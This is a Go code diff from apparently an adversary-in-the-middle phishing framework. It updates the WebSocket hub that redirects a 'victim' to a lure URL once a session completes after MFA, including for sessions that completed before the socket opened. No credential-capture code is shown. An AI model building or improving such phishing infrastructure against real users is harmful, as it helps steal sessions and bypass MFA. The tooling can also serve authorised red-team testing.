@@ -26,36 +26,41 @@ type eventSubscriber interface {
 // WebSocket connections waiting on that session ID.
 type WSHub struct {
 	upgrader websocket.Upgrader
+	sessions sessionGetter
 	mu       sync.Mutex
 	waiting  map[string][]chan redirectMsg // session ID → waiting channels
 	logger   *slog.Logger
 }
 
-func NewWSHub(bus eventSubscriber, logger *slog.Logger) *WSHub {
+func NewWSHub(bus eventSubscriber, sessions sessionGetter, logger *slog.Logger) *WSHub {
 	hub := &WSHub{
 		upgrader: websocket.Upgrader{
 			CheckOrigin: func(r *http.Request) bool { return true },
 		},
-		waiting: make(map[string][]chan redirectMsg),
-		logger:  logger,
+		sessions: sessions,
+		waiting:  make(map[string][]chan redirectMsg),
+		logger:   logger,
 	}
+
 	go hub.listenCompletions(bus)
+
 	return hub
 }
 
 func (h *WSHub) listenCompletions(bus eventSubscriber) {
 	completionCh := bus.Subscribe(aitm.EventSessionCompleted)
 	for event := range completionCh {
-		sess, ok := event.Payload.(*aitm.Session)
+		session, ok := event.Payload.(*aitm.Session)
 		if !ok {
 			continue
 		}
+
 		h.mu.Lock()
-		waiters := h.waiting[sess.ID]
-		delete(h.waiting, sess.ID)
+		waiters := h.waiting[session.ID]
+		delete(h.waiting, session.ID)
 		h.mu.Unlock()
 
-		msg := redirectMsg{RedirectURL: sess.LureRedirectURL()}
+		msg := redirectMsg{RedirectURL: session.LureRedirectURL()}
 		for _, waiterCh := range waiters {
 			waiterCh <- msg
 		}
@@ -65,14 +70,24 @@ func (h *WSHub) listenCompletions(bus eventSubscriber) {
 // HandleUpgrade handles GET /ws/{sid}: blocks until the session completes,
 // then sends the redirect URL and closes the connection.
 func (h *WSHub) HandleUpgrade(w http.ResponseWriter, r *http.Request, sessionID string) {
-	// Register the waiter before upgrading so that by the time the client's
-	// Dial returns (after receiving the 101 response), the waiter is already
-	// in place. This eliminates the race where a completion event fires between
-	// Dial returning and the waiter being registered.
+	// Register the waiter before checking session state so we cannot miss a
+	// completion event that fires in the gap between the check and registration.
 	resultCh := make(chan redirectMsg, 1)
 	h.mu.Lock()
 	h.waiting[sessionID] = append(h.waiting[sessionID], resultCh)
 	h.mu.Unlock()
+
+	// If the session is already complete (e.g. the victim's browser navigated
+	// to a new page after MFA and opened a fresh WebSocket after the completion
+	// event already fired), pre-fill the channel so the select below fires
+	// immediately. If a concurrent completion event also sends to resultCh,
+	// the default branch is taken and the event's message is used instead.
+	if session, err := h.sessions.Get(sessionID); err == nil && session.IsDone() {
+		select {
+		case resultCh <- redirectMsg{RedirectURL: session.LureRedirectURL()}:
+		default: // concurrent completion event already filled the channel
+		}
+	}
 
 	conn, err := h.upgrader.Upgrade(w, r, nil)
 	if err != nil {
